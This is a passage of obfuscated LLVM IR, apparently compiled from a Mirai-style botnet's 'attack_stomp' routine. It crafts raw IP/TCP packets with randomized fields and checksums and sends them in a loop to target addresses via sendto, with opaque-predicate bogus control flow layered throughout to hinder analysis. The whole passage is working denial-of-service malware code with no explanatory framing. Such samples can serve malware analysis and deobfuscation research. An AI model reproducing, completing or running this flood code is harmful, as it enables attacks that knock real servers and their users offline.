  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %356, i32 0, i32 3
  store i16 %352, i16* %357, align 4
  %358 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %359 = load i16, i16* %358, align 2
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  store i16 %359, i16* %364, align 2
  %365 = load i32, i32* %24, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 40, %366
  %368 = call noalias i8* @malloc(i64 %367) #6
  %369 = load i8**, i8*** %12, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds i8*, i8** %369, i64 %371
  store i8* %368, i8** %372, align 8
  %373 = load i8**, i8*** %12, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds i8*, i8** %373, i64 %375
  %377 = load i8*, i8** %376, align 8
  %378 = bitcast i8* %377 to %struct.iphdr*
  store %struct.iphdr* %378, %struct.iphdr** %36, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i64 1
  %381 = bitcast %struct.iphdr* %380 to %struct.tcphdr*
  store %struct.tcphdr* %381, %struct.tcphdr** %37, align 8
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i64 1
  %384 = bitcast %struct.tcphdr* %383 to i8*
  store i8* %384, i8** %38, align 8
  %385 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %386 = bitcast %struct.iphdr* %385 to i8*
  %387 = load i8, i8* %386, align 4
  %388 = and i8 %387, 15
  %389 = or i8 %388, 64
  store i8 %389, i8* %386, align 4
  %390 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %391 = bitcast %struct.iphdr* %390 to i8*
  %392 = load i8, i8* %391, align 4
  %393 = and i8 %392, -16
  %394 = or i8 %393, 5
  store i8 %394, i8* %391, align 4
  %395 = load i8, i8* %13, align 1
  %396 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 1
  store i8 %395, i8* %397, align 1
  %398 = load i32, i32* %24, align 4
  %399 = sext i32 %398 to i64
  %400 = add i64 40, %399
  %401 = trunc i64 %400 to i16
  %402 = call zeroext i16 @htons(i16 zeroext %401) #7
  %403 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 2
  store i16 %402, i16* %404, align 2
  %405 = load i16, i16* %14, align 2
  %406 = call zeroext i16 @htons(i16 zeroext %405) #7
  %407 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load i8, i8* %15, align 1
  %410 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 5
  store i8 %409, i8* %411, align 4
  %412 = load i8, i8* %16, align 1
  %413 = icmp ne i8 %412, 0
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %323
  %415 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %416 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 4
  store i16 %415, i16* %417, align 2
  br label %418

; <label>:418:                                    ; preds = %414, %323
  %419 = load i32, i32* @x.29
  %420 = load i32, i32* @y.30
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %418
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 6
  store i8 6, i8* %428, align 1
  %429 = load i32, i32* @LOCAL_ADDR, align 4
  %430 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 8
  store i32 %429, i32* %431, align 4
  %432 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %433 = load i32, i32* %9, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
  %438 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 9
  store i32 %437, i32* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 3
  %445 = load i16, i16* %444, align 4
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 0
  store i16 %445, i16* %447, align 4
  %448 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %449 = load i32, i32* %9, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 2
  %454 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 1
  store i16 %453, i16* %455, align 2
  %456 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %457 = load i32, i32* %9, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i32 0, i32 2
  %461 = load i32, i32* %460, align 4
  %462 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 2
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 1
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 3
  store i32 %469, i32* %471, align 4
  %472 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 4
  %474 = load i16, i16* %473, align 4
  %475 = and i16 %474, -241
  %476 = or i16 %475, 128
  store i16 %476, i16* %473, align 4
  %477 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 4
  %479 = load i16, i16* %478, align 4
  %480 = and i16 %479, -257
  %481 = or i16 %480, 256
  store i16 %481, i16* %478, align 4
  %482 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 4
  %484 = load i16, i16* %483, align 4
  %485 = and i16 %484, -4097
  %486 = or i16 %485, 4096
  store i16 %486, i16* %483, align 4
  %487 = call i32 @rand_next()
  %488 = and i32 %487, 65535
  %489 = trunc i32 %488 to i16
  %490 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 5
  store i16 %489, i16* %491, align 2
  %492 = load i8, i8* %18, align 1
  %493 = sext i8 %492 to i16
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 4
  %496 = load i16, i16* %495, align 4
  %497 = and i16 %493, 1
  %498 = shl i16 %497, 13
  %499 = and i16 %496, -8193
  %500 = or i16 %499, %498
  store i16 %500, i16* %495, align 4
  %501 = load i8, i8* %19, align 1
  %502 = sext i8 %501 to i16
  %503 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 4
  %505 = load i16, i16* %504, align 4
  %506 = and i16 %502, 1
  %507 = shl i16 %506, 12
  %508 = and i16 %505, -4097
  %509 = or i16 %508, %507
  store i16 %509, i16* %504, align 4
  %510 = load i8, i8* %20, align 1
  %511 = sext i8 %510 to i16
  %512 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %511, 1
  %516 = shl i16 %515, 11
  %517 = and i16 %514, -2049
  %518 = or i16 %517, %516
  store i16 %518, i16* %513, align 4
  %519 = load i8, i8* %21, align 1
  %520 = sext i8 %519 to i16
  %521 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 4
  %523 = load i16, i16* %522, align 4
  %524 = and i16 %520, 1
  %525 = shl i16 %524, 10
  %526 = and i16 %523, -1025
  %527 = or i16 %526, %525
  store i16 %527, i16* %522, align 4
  %528 = load i8, i8* %22, align 1
  %529 = sext i8 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 4
  %532 = load i16, i16* %531, align 4
  %533 = and i16 %529, 1
  %534 = shl i16 %533, 9
  %535 = and i16 %532, -513
  %536 = or i16 %535, %534
  store i16 %536, i16* %531, align 4
  %537 = load i8, i8* %23, align 1
  %538 = sext i8 %537 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 4
  %541 = load i16, i16* %540, align 4
  %542 = and i16 %538, 1
  %543 = shl i16 %542, 8
  %544 = and i16 %541, -257
  %545 = or i16 %544, %543
  store i16 %545, i16* %540, align 4
  %546 = load i8*, i8** %38, align 8
  %547 = load i32, i32* %24, align 4
  call void @rand_str(i8* %546, i32 %547)
  %548 = load i32, i32* @x.29
  %549 = load i32, i32* @y.30
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart2257, label %originalBB30alteredBB

originalBBpart2257:                               ; preds = %originalBB30
  br label %635

; <label>:556:                                    ; preds = %315, %307
  %557 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 4
  %559 = load i16, i16* %558, align 4
  %560 = lshr i16 %559, 8
  %561 = and i16 %560, 1
  %562 = zext i16 %561 to i32
  %563 = icmp ne i32 %562, 0
  br i1 %563, label %572, label %564

; <label>:564:                                    ; preds = %556
  %565 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 4
  %567 = load i16, i16* %566, align 4
  %568 = lshr i16 %567, 10
  %569 = and i16 %568, 1
  %570 = zext i16 %569 to i32
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %572, label %575

; <label>:572:                                    ; preds = %564, %556
  %573 = load i32, i32* %26, align 4
  %574 = call i32 @close(i32 %573)
  br label %121

; <label>:575:                                    ; preds = %564
  %576 = load i32, i32* @x.29
  %577 = load i32, i32* @y.30
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBB259, label %originalBB259alteredBB

originalBB259:                                    ; preds = %originalBB259alteredBB, %575
  %584 = load i32, i32* @x.29
  %585 = load i32, i32* @y.30
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart2261, label %originalBB259alteredBB

originalBBpart2261:                               ; preds = %originalBB259
  br label %592

; <label>:592:                                    ; preds = %originalBBpart2261
  br label %593

; <label>:593:                                    ; preds = %592, %295
  br label %594

; <label>:594:                                    ; preds = %593, %291, %283
  %595 = load i32, i32* @x.29
  %596 = load i32, i32* @y.30
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBB263, label %originalBB263alteredBB

originalBB263:                                    ; preds = %originalBB263alteredBB, %594
  %603 = call i64 @time(i64* null) #6
  %604 = load i64, i64* %31, align 8
  %605 = sub nsw i64 %603, %604
  %606 = icmp sgt i64 %605, 10
  %607 = load i32, i32* @x.29
  %608 = load i32, i32* @y.30
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart2269, label %originalBB263alteredBB

originalBBpart2269:                               ; preds = %originalBB263
  br i1 %606, label %615, label %634

; <label>:615:                                    ; preds = %originalBBpart2269
  %616 = load i32, i32* @x.29
  %617 = load i32, i32* @y.30
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB271, label %originalBB271alteredBB

originalBB271:                                    ; preds = %originalBB271alteredBB, %615
  %624 = load i32, i32* %26, align 4
  %625 = call i32 @close(i32 %624)
  %626 = load i32, i32* @x.29
  %627 = load i32, i32* @y.30
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart2273, label %originalBB271alteredBB

originalBBpart2273:                               ; preds = %originalBB271
  br label %121

; <label>:634:                                    ; preds = %originalBBpart2269
  br label %239

; <label>:635:                                    ; preds = %originalBBpart2257
  br label %636

; <label>:636:                                    ; preds = %635, %originalBBpart2
  %637 = load i32, i32* @x.29
  %638 = load i32, i32* @y.30
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB275, label %originalBB275alteredBB

originalBB275:                                    ; preds = %originalBB275alteredBB, %636
  %645 = load i32, i32* %9, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %9, align 4
  %647 = load i32, i32* @x.29
  %648 = load i32, i32* @y.30
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart2283, label %originalBB275alteredBB

originalBBpart2283:                               ; preds = %originalBB275
  br label %115

; <label>:655:                                    ; preds = %115
  br label %656

; <label>:656:                                    ; preds = %814, %655
  store i32 0, i32* %9, align 4
  br label %657

; <label>:657:                                    ; preds = %originalBBpart2319, %656
  %658 = load i32, i32* @x.29
  %659 = load i32, i32* @y.30
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %657
  %666 = load i32, i32* %9, align 4
  %667 = load i8, i8* %5, align 1
  %668 = zext i8 %667 to i32
  %669 = icmp slt i32 %666, %668
  %670 = load i32, i32* @x.29
  %671 = load i32, i32* @y.30
  %672 = sub i32 %670, 1
  %673 = mul i32 %670, %672
  %674 = urem i32 %673, 2
  %675 = icmp eq i32 %674, 0
  %676 = icmp slt i32 %671, 10
  %677 = or i1 %675, %676
  br i1 %677, label %originalBBpart2287, label %originalBB285alteredBB

originalBBpart2287:                               ; preds = %originalBB285
  br i1 %669, label %678, label %814

; <label>:678:                                    ; preds = %originalBBpart2287
  %679 = load i8**, i8*** %12, align 8
  %680 = load i32, i32* %9, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds i8*, i8** %679, i64 %681
  %683 = load i8*, i8** %682, align 8
  store i8* %683, i8** %39, align 8
  %684 = load i8*, i8** %39, align 8
  %685 = bitcast i8* %684 to %struct.iphdr*
  store %struct.iphdr* %685, %struct.iphdr** %40, align 8
  %686 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i64 1
  %688 = bitcast %struct.iphdr* %687 to %struct.tcphdr*
  store %struct.tcphdr* %688, %struct.tcphdr** %41, align 8
  %689 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i64 1
  %691 = bitcast %struct.tcphdr* %690 to i8*
  store i8* %691, i8** %42, align 8
  %692 = load i16, i16* %14, align 2
  %693 = zext i16 %692 to i32
  %694 = icmp eq i32 %693, 65535
  br i1 %694, label %695, label %701

; <label>:695:                                    ; preds = %678
  %696 = call i32 @rand_next()
  %697 = and i32 %696, 65535
  %698 = trunc i32 %697 to i16
  %699 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %700 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %699, i32 0, i32 3
  store i16 %698, i16* %700, align 4
  br label %701

; <label>:701:                                    ; preds = %695, %678
  %702 = load i8, i8* %25, align 1
  %703 = icmp ne i8 %702, 0
  br i1 %703, label %704, label %707

; <label>:704:                                    ; preds = %701
  %705 = load i8*, i8** %42, align 8
  %706 = load i32, i32* %24, align 4
  call void @rand_str(i8* %705, i32 %706)
  br label %707

; <label>:707:                                    ; preds = %704, %701
  %708 = load i32, i32* @x.29
  %709 = load i32, i32* @y.30
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB289, label %originalBB289alteredBB

originalBB289:                                    ; preds = %originalBB289alteredBB, %707
  %716 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %717 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %716, i32 0, i32 7
  store i16 0, i16* %717, align 2
  %718 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %719 = bitcast %struct.iphdr* %718 to i16*
  %720 = call zeroext i16 @checksum_generic(i16* %719, i32 20)
  %721 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %722 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %721, i32 0, i32 7
  store i16 %720, i16* %722, align 2
  %723 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %724 = load i32, i32* %9, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %723, i64 %725
  %727 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %726, i32 0, i32 1
  %728 = load i32, i32* %727, align 4
  %729 = add i32 %728, 1
  store i32 %729, i32* %727, align 4
  %730 = trunc i32 %728 to i16
  %731 = call zeroext i16 @htons(i16 zeroext %730) #7
  %732 = zext i16 %731 to i32
  %733 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %734 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %733, i32 0, i32 2
  store i32 %732, i32* %734, align 4
  %735 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %736 = load i32, i32* %9, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %735, i64 %737
  %739 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %738, i32 0, i32 2
  %740 = load i32, i32* %739, align 4
  %741 = trunc i32 %740 to i16
  %742 = call zeroext i16 @htons(i16 zeroext %741) #7
  %743 = zext i16 %742 to i32
  %744 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %745 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %744, i32 0, i32 3
  store i32 %743, i32* %745, align 4
  %746 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %747 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %746, i32 0, i32 6
  store i16 0, i16* %747, align 4
  %748 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %749 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %750 = bitcast %struct.tcphdr* %749 to i8*
  %751 = load i32, i32* %24, align 4
  %752 = sext i32 %751 to i64
  %753 = add i64 20, %752
  %754 = trunc i64 %753 to i16
  %755 = call zeroext i16 @htons(i16 zeroext %754) #7
  %756 = load i32, i32* %24, align 4
  %757 = sext i32 %756 to i64
  %758 = add i64 20, %757
  %759 = trunc i64 %758 to i32
  %760 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %748, i8* %750, i16 zeroext %755, i32 %759)
  %761 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %762 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %761, i32 0, i32 6
  store i16 %760, i16* %762, align 4
  %763 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %764 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %763, i32 0, i32 1
  %765 = load i16, i16* %764, align 2
  %766 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %767 = load i32, i32* %9, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %766, i64 %768
  %770 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %769, i32 0, i32 0
  %771 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %770, i32 0, i32 1
  store i16 %765, i16* %771, align 2
  %772 = load i32, i32* %10, align 4
  %773 = load i8*, i8** %39, align 8
  %774 = load i32, i32* %24, align 4
  %775 = sext i32 %774 to i64
  %776 = add i64 40, %775
  %777 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %778 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %779 = load i32, i32* %9, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %778, i64 %780
  %782 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %781, i32 0, i32 0
  %783 = bitcast %struct.sockaddr_in* %782 to %struct.sockaddr*
  store %struct.sockaddr* %783, %struct.sockaddr** %777, align 8
  %784 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %785 = load %struct.sockaddr*, %struct.sockaddr** %784, align 8
  %786 = call i64 @sendto(i32 %772, i8* %773, i64 %776, i32 16384, %struct.sockaddr* %785, i32 16)
  %787 = load i32, i32* @x.29
  %788 = load i32, i32* @y.30
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBBpart2312, label %originalBB289alteredBB

originalBBpart2312:                               ; preds = %originalBB289
  br label %795

; <label>:795:                                    ; preds = %originalBBpart2312
  %796 = load i32, i32* @x.29
  %797 = load i32, i32* @y.30
  %798 = sub i32 %796, 1
  %799 = mul i32 %796, %798
  %800 = urem i32 %799, 2
  %801 = icmp eq i32 %800, 0
  %802 = icmp slt i32 %797, 10
  %803 = or i1 %801, %802
  br i1 %803, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %795
  %804 = load i32, i32* %9, align 4
  %805 = add nsw i32 %804, 1
  store i32 %805, i32* %9, align 4
  %806 = load i32, i32* @x.29
  %807 = load i32, i32* @y.30
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBBpart2319, label %originalBB314alteredBB

originalBBpart2319:                               ; preds = %originalBB314
  br label %657

; <label>:814:                                    ; preds = %originalBBpart2287
  br label %656

; <label>:815:                                    ; preds = %originalBBpart228, %111, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %124
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %156
  %816 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %817 = load i32, i32* %9, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %816, i64 %818
  %820 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %819, i32 0, i32 1
  %821 = load i32, i32* %820, align 4
  %822 = call i32 @ntohl(i32 %821) #7
  %823 = call i32 @rand_next()
  %824 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %825 = load i32, i32* %9, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %824, i64 %826
  %828 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %827, i32 0, i32 2
  %829 = load i8, i8* %828, align 4
  %830 = zext i8 %829 to i32
  %_ = sub i32 0, %823
  %gen = add i32 %_, %830
  %_2 = sub i32 %823, %830
  %gen3 = mul i32 %_2, %830
  %_4 = shl i32 %823, %830
  %_5 = sub i32 %823, %830
  %gen6 = mul i32 %_5, %830
  %_7 = sub i32 %823, %830
  %gen8 = mul i32 %_7, %830
  %831 = lshr i32 %823, %830
  %_9 = sub i32 0, %822
  %gen10 = add i32 %_9, %831
  %_11 = sub i32 %822, %831
  %gen12 = mul i32 %_11, %831
  %_13 = sub i32 %822, %831
  %gen14 = mul i32 %_13, %831
  %832 = add i32 %822, %831
  %833 = call i32 @htonl(i32 %832) #7
  %834 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %835 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %834, i32 0, i32 0
  store i32 %833, i32* %835, align 4
  br label %originalBB1

originalBB18alteredBB:                            ; preds = %originalBB18, %211
  %836 = load i16, i16* %17, align 2
  %837 = call zeroext i16 @htons(i16 zeroext %836) #7
  %838 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %837, i16* %838, align 2
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %239
  store i32 16, i32* %29, align 4
  %839 = load i32, i32* %10, align 4
  %840 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %841 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %842 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %842, %struct.sockaddr** %841, align 8
  %843 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %844 = load %struct.sockaddr*, %struct.sockaddr** %843, align 8
  %845 = call i64 @recvfrom(i32 %839, i8* %840, i64 256, i32 16384, %struct.sockaddr* %844, i32* %29)
  %846 = trunc i64 %845 to i32
  store i32 %846, i32* %33, align 4
  %847 = load i32, i32* %33, align 4
  %848 = icmp eq i32 %847, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %266
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %418
  %849 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %850 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %849, i32 0, i32 6
  store i8 6, i8* %850, align 1
  %851 = load i32, i32* @LOCAL_ADDR, align 4
